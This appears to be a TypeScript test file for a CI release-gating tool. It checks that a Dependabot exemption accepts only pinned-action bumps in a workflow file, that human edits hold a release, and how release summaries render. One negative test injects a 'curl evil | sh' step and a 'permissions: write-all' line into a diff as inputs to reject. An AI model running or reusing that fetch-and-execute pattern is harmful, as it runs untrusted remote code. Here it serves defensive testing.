import { execFileSync } from 'node:child_process'
import { mkdirSync, mkdtempSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'

import { classify } from './classify'
import { isDependabot, isExemptWorkflowChange, usesOnlyDiff } from './exemptions'
import { readRange } from './gitReader'
import { renderSummary } from './summary'

const bump = [
    '--- a/.github/workflows/ci.yml',
    '+++ b/.github/workflows/ci.yml',
    '@@ -10 +10 @@',
    '-        uses: actions/checkout@aaa # v7.0.1',
    '+        uses: actions/checkout@bbb # v7.0.2'
].join('\n')

describe('dependabot exemption', () => {
    it('accepts a diff of uses lines only', () => {
        expect(usesOnlyDiff(bump)).toBe(true)
    })

    it('rejects anything else in the diff, and an empty diff', () => {
        expect(usesOnlyDiff(`${bump}\n+      run: curl evil | sh`)).toBe(false)
        expect(usesOnlyDiff(`${bump}\n+    permissions: write-all`)).toBe(false)
        expect(usesOnlyDiff('')).toBe(false)
    })

    it('needs every commit on the file to be dependabot', () => {
        const dependabot = ['dependabot[bot] <49699333+dependabot[bot]@users.noreply.github.com>']
        expect(isDependabot(dependabot[0])).toBe(true)
        expect(isExemptWorkflowChange('.github/workflows/ci.yml', dependabot, bump)).toBe(true)
        expect(isExemptWorkflowChange('.github/workflows/ci.yml', [...dependabot, 'Bar <bar@x.dev>'], bump)).toBe(false)
        expect(isExemptWorkflowChange('.github/workflows/ci.yml', [], bump)).toBe(false)
        expect(isExemptWorkflowChange('Dockerfile', dependabot, bump)).toBe(false)
    })
})

describe('readRange in a real repo', () => {
    const git = (cwd: string, ...args: string[]) => execFileSync('git', args, {
        cwd,
        encoding: 'utf8'
    }).trim()

    const makeRepo = () => {
        const dir = mkdtempSync(join(tmpdir(), 'ship-rules-'))
        git(dir, 'init', '-q')
        git(dir, 'config', 'user.email', 'dev@example.com')
        git(dir, 'config', 'user.name', 'Dev')
        git(dir, 'config', 'commit.gpgsign', 'false')
        mkdirSync(join(dir, '.github', 'workflows'), { recursive: true })
        writeFileSync(join(dir, '.github', 'workflows', 'ci.yml'), 'steps:\n  - uses: actions/checkout@aaa\n')
        git(dir, 'add', '.')
        git(dir, 'commit', '-q', '-m', 'init')
        return dir
    }

    it('exempts a dependabot uses bump and holds a human edit of the same file', () => {
        const dir = makeRepo()
        const last = git(dir, 'rev-parse', 'HEAD')
        writeFileSync(join(dir, '.github', 'workflows', 'ci.yml'), 'steps:\n  - uses: actions/checkout@bbb\n')
        git(dir, 'add', '.')
        git(dir, 'commit', '-q', '-m', 'chore(deps): bump checkout', '--author', 'dependabot[bot] <49699333+dependabot[bot]@users.noreply.github.com>')
        const bumped = readRange(dir, last, git(dir, 'rev-parse', 'HEAD'))
        expect(classify({
            ...bumped,
            prTexts: ['Client impact: none']
        }).hold).toBe(false)

        writeFileSync(join(dir, '.github', 'workflows', 'ci.yml'), 'steps:\n  - uses: actions/checkout@bbb\n  - run: echo hi\n')
        git(dir, 'add', '.')
        git(dir, 'commit', '-q', '-m', 'chore: add step')
        const edited = readRange(dir, last, git(dir, 'rev-parse', 'HEAD'))
        expect(classify({
            ...edited,
            prTexts: ['Client impact: none']
        }).hold).toBe(true)
    })
})

describe('renderSummary', () => {
    const input = {
        changedFiles: ['prisma/schema.prisma', 'src/services/forumService.ts'],
        commitMessages: ['feat(forum): pin posts\n\nBody', 'chore: tidy'],
        prTexts: ['Client impact: the post type gains a pinned field']
    }

    it('lists the matched rule, areas, new behaviour and client impact for a held release', () => {
        const text = renderSummary(
            classify(input),
            input,
            ['migrations']
        )
        expect(text).toContain('held (`needs-review`)')
        expect(text).toContain('migrations: prisma/schema.prisma')
        expect(text).toContain('- prisma/schema.prisma'.replace('/schema.prisma', ''))
        expect(text).toContain('feat(forum): pin posts')
        expect(text).not.toContain('chore: tidy')
        expect(text).toContain('Client impact: the post type gains a pinned field')
    })

    it('lists what was checked for an auto release', () => {
        const auto = {
            changedFiles: ['src/utils/capitalizeText.ts'],
            commitMessages: ['fix: x'],
            prTexts: ['Client impact: none']
        }
        const text = renderSummary(
            classify(auto),
            auto,
            ['migrations', 'ai']
        )
        expect(text).toContain('auto-ship')
        expect(text).toContain('migrations, ai')
    })
})
